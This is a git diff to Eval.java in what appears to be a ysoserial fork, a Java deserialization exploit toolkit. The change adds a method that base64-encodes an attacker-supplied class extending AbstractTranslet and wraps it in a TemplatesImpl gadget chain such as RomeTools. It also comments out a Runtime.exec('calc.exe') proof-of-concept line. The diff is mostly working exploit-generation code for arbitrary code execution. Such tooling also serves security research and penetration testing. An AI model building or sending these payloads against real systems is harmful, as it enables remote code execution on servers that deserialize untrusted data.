@@ -2,18 +2,22 @@ package ysoserial.payloads;
 
 import javassist.ClassPool;
 import javassist.CtClass;
+import top.inhann.Fuck;
 import ysoserial.Deserializer;
 import ysoserial.Serializer;
 
 import java.io.FileReader;
+import java.util.Base64;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
 public class Eval {
     public static void main(String[] args) throws Exception{
-        String code = "Runtime.getRuntime().exec(\"calc.exe\");";
-        Object o = new Eval().getObject(RomeTools.class,code);
+//        String code = "Runtime.getRuntime().exec(\"calc.exe\");";
+//        Object o = new Eval().getObject(RomeTools.class,code);
+        Object o = new Eval().getObject(RomeTools.class, Fuck.class);
         byte[] ser = Serializer.serialize(o);
+
         Deserializer.deserialize(ser);
     }
     public Object getObject(Class gadget,String code) throws Exception {
@@ -26,6 +30,39 @@ public class Eval {
         }
         ObjectPayload o = (ObjectPayload)gadget.newInstance();
         return o.getObject("CODE;" + code);
+    }
+    public Object getObject(Class gadget,Class evilClass) throws Exception {
+
+        final Class superClass = evilClass.getSuperclass();
+
+        if (!superClass.getName().equals("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet")) {
+            throw new Exception("[!] evilClass must extend from com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet.");
+        }
+
+        ClassPool pool = ClassPool.getDefault();
+        CtClass clazz = pool.get(gadget.getName());
+        byte[] bytes = clazz.toBytecode();
+        String s = new String(bytes);
+        if(!s.contains("createTemplatesImpl")){
+            throw new Exception("[!] The Gadget must use TemplatesImpl");
+        }
+        ObjectPayload o = (ObjectPayload)gadget.newInstance();
+
+        pool = ClassPool.getDefault();
+        clazz = pool.get(evilClass.getName());
+        bytes = clazz.toBytecode();
+
+        s = new String(bytes);
+        if(s.contains(evilClass.getName().replace(".","/") + "$")){
+            throw new Exception("[!] Do not use inner class or anonymous class in evilClass.");
+        }
+        String b = new String(Base64.getEncoder().encode(bytes));
+
+        String command = "CLASS;" + b;
+        String javacode = command.substring(6);
+        byte[] classBytes = Base64.getDecoder().decode(javacode);
+
+        return o.getObject("CLASS;" + b);
     }
     public static String getJavaCodeFromJSP(String poc) throws Exception{
         FileReader f = new FileReader(poc);
